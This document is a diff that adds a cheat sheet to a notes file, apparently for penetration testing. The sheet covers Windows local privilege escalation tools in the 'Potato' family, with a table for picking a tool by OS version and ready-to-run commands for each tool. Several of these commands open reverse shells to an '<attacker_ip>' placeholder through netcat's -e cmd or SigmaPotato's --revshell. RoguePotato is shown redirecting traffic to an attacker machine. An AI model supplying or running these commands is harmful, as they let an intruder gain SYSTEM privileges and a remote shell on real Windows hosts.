@@ -1,4 +1,75 @@
-Thinking
+Quick Selection Guide (Professional Recommendation)
+
+If the OS is...                  And you have SeImpersonate...	                                                         Use this tool:
+Windows Server 2016 / 2019	    Print Spooler Service is ON	                                                    PrintSpoofer (Fastest/Interactive)
+Windows Server 2016 / 2019	    Print Spooler Service is OFF	                                                GodPotato
+Windows Server 2022 / Win 11	Any configuration	                                                            GodPotato or SigmaPotato
+Windows Server 2012 / R2	    Any configuration	                                                            Juicy Potato
+
+
+----------------------------------------------------------------------------------------------
+
+Below are the standard command-line examples for the most common Windows Local Privilege Escalation (LPE) tools as of 2025. These tools generally require the
+SeImpersonatePrivilege to be enabled for the current user.
+1. PrintSpoofer
+Best for Windows Server 2016, 2019, and Windows 10. It leverages the Print Spooler service. Source. 
+
+    Interactive Shell:
+    .\PrintSpoofer.exe -i -c cmd
+    Execute a Command:
+    .\PrintSpoofer.exe -c "whoami"
+    Reverse Shell (using Netcat):
+    .\PrintSpoofer.exe -c "C:\tools\nc.exe <attacker_ip> <port> -e cmd" 
+
+2. GodPotato
+The "latest" standard for Server 2012–2022 and Windows 10/11. It uses a DCOM-based exploit. Source. 
+
+    Standard Privilege Check:
+    .\GodPotato.exe -cmd "cmd /c whoami"
+    Reverse Shell:
+    .\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe <attacker_ip> <port>" 
+
+3. SigmaPotato
+A modern alternative (2024/2025) often used when others fail on newer Windows versions. Source. 
+
+    Direct Command:
+    .\SigmaPotato.exe "whoami"
+    Built-in Reverse Shell:
+    .\SigmaPotato.exe --revshell <attacker_ip> <port> 
+
+4. JuicyPotato (Legacy)
+Primarily for Windows Server 2012 R2 and early Server 2016 versions. Source. 
+
+    Basic Execution (requires a valid CLSID):
+    .\JuicyPotato.exe -t * -p cmd.exe -l 1337 -c {CLSID}
+    Note: You must specify a CLSID relevant to the specific OS version. 
+
+5. RoguePotato
+Used when JuicyPotato fails on newer systems (like Server 2019) by redirecting traffic to an external machine. Source. 
+
+    Basic Execution:
+    .\RoguePotato.exe -r <attacker_ip> -e "cmd.exe" -l 9999
+    Note: This often requires setting up a port forwarder (like socat) on the attacker's machine to redirect port 135. 
+
+6. EfsPotato / SharpEfsPotato
+Exploits the MS-EFSR (Encrypting File System Remote Protocol). Source. 
+
+    Command Execution:
+    .\EfsPotato.exe "cmd.exe /c whoami"
+    Using SharpEfsPotato:
+    .\SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami" 
+
+Summary of Command Syntax
+Tool
+	Primary Flag	Example Command
+PrintSpoofer	-c	.\PrintSpoofer.exe -c "cmd /c whoami"
+GodPotato	-cmd	.\GodPotato.exe -cmd "whoami"
+SigmaPotato	(Direct)	.\SigmaPotato.exe "whoami"
+JuicyPotato	-p	.\JuicyPotato.exe -t * -p C:\temp\nc.exe -l 4444
+
+----------------------------------------------------------------------------------------------------------
+
+
 Here are the professionally recognized names for Local Privilege Escalation (LPE) exploits and tools commonly used in Windows environments, categorized by their underlying technique:
 Token Impersonation/Manipulation ("Potato" Family)
 
